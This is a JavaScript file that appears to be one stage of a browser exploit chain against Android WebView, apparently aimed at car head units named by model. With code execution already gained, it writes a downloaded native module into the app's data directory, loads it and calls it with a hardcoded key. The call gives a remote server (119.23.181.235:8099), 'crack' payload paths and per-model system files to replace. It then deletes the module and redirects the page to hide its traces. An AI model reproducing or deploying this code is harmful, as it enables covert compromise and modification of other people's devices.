var ENABLE_DEBUG = !0;
function finish() {
    window.location.replace("http://127.0.0.1")
}
function stage4(memobj, rce, libc, libwebcore, addr) {
    ENABLE_DEBUG && INFO("> [ Stage 4 ]");
    var system = libc.requiresymbol("system"),
    fopen = libc.requiresymbol("fopen"),
    fread = libc.requiresymbol("fread"),
    fgets = libc.requiresymbol("fgets"),
    fwrite = libc.requiresymbol("fwrite"),
    fclose = libc.requiresymbol("fclose"),
    getpid = libc.requiresymbol("getpid"),
    cmd = addr + 53248;
    memobj.writestring(cmd, "/proc/self/cmdline");
    var mode = addr + 53504;
    memobj.writestring(mode, "r");
    var buffer = addr + 53760,
    fp = rce.call(fopen, cmd, mode);
    0 === fp && ERR("Can't open file");
    var retval = rce.call(fgets, buffer, 256, fp);
    retval != buffer && ERR("fgets() failed: " + retval);
    var processname = memobj.readstring(buffer);
    rce.call(fclose, fp);
    var pid = rce.call(getpid),
    intid;
    function complete_stage4() {
        function writefile(e, r) {
            memobj.writestring(cmd, e),
            memobj.writestring(mode, "wb"),
            0 === (fp = rce.call(fopen, cmd, mode)) && ERR("cannot open file for writing: " + e);
            for (var t = r.byteLength,
            a = 0,
            o = 0; t > 0;) {
                if (t < 4) {
                    o = t;
                    for (var i = 0; i < t; i++) memobj.write8(buffer + i, r.getUint8(a + i))
                } else {
                    for (i = 0; i < Math.min(64, t / 4); i++) memobj.write32(buffer + 4 * i, r.getUint32(a + 4 * i, !0));
                    o = 4 * Math.min(64, t / 4)
                }
                var c = rce.call(fwrite, buffer, 1, o, fp);
                c != o && ERR("Failed to write file: write for " + o + " issued, got " + c),
                a += o,
                t -= o
            }
            rce.call(fclose, fp)
        }
        null === window.g_module && ERR("Module download failed!");
        var basepath = "/data/data/" + processname,
        modulepath = basepath + "/module.so";
        writefile(modulepath, window.g_module);
        var dlsym = libc.findreloc("dlsym"),
        dlopen = libc.findreloc("dlopen"),
        dlclose = libc.findreloc("dlclose");
        memobj.writestring(cmd, modulepath);
        var handle = rce.call(dlopen, cmd, 0);
        memobj.writestring(cmd, "am_start");
        var am_start = rce.call(dlsym, handle, cmd);
        memobj.writestring(cmd, basepath);
        var params = cmd + 256,
        carId = findGetParameter("carId"),
        token = findGetParameter("token"),
        agent = findGetParameter("agent"),
        replace_filename = "";
        if (carId) {
            switch (carId) {
            case "spirior":
            case "accord":
                replace_filename = "/system/etc/factory_reset.sh";
                break;
            case "civic":
            case "avancier":
            case "crv":
            case "urv":
            case "cdx":
                replace_filename = "/system/bin/applypatch"
            }
            var t = (new Date).getTime();
            memobj.writearray(params + 0, eval("[0xa2, 0xb0, 0xc8, 0xa5, 0xef, 0x11, 0xf4, 0x12, 0xc2, 0x67, 0x24, 0x4c, 0xb1, 0xbe, 0xc6, 0x15, 0x66, 0x1b, 0xda, 0xde, 0xae, 0x90, 0x36, 0xc1, 0x75, 0x68, 0xb0, 0xa9, 0x64, 0xc5, 0x43, 0x0e]")),
            memobj.writestring(params + 256, "/logo.png?token=" + token + "&carId=" + carId + "&t=" + t),
            memobj.writestring(params + 512, "getcrack"),
            memobj.writestring(params + 768, "119.23.181.235"),
            memobj.writestring(params + 1024, "/logo2.png?token=" + token + "&carId=" + carId + "&agent=" + agent + "&t=" + t),
            memobj.writestring(params + 1280, "crack"),
            memobj.writestring(params + 1536, "/logo3.png?token=" + token + "&carId=" + carId + "&agent=" + agent + "&t=" + t),
            memobj.writestring(params + 1792, "/logo4.png?token=" + token + "&carId=" + carId + "&agent=" + agent + "&t=" + t);
            var port = parseInt("8099"),
            result = rce.forkingcall(am_start, cmd, port, params);
            memobj.writestring(cmd, "rm " + modulepath),
            rce.call(system, cmd),
            finish()
        }
    } (ENABLE_DEBUG && INFO("Got RCE for " + processname + " (PID: " + pid + ")"), void 0 === window.g_module) ? intid = window.setInterval(function() {
        void 0 !== window.g_module && (complete_stage4(), window.clearInterval(intid))
    },
    100) : complete_stage4()
}
void 0 === window.INFO && (INFO = function(e) {
    console.log(e)
}),
void 0 === window.ERR && (ERR = function() {
    throw window.location.replace("http://127.0.0.1"),
    Error()
});
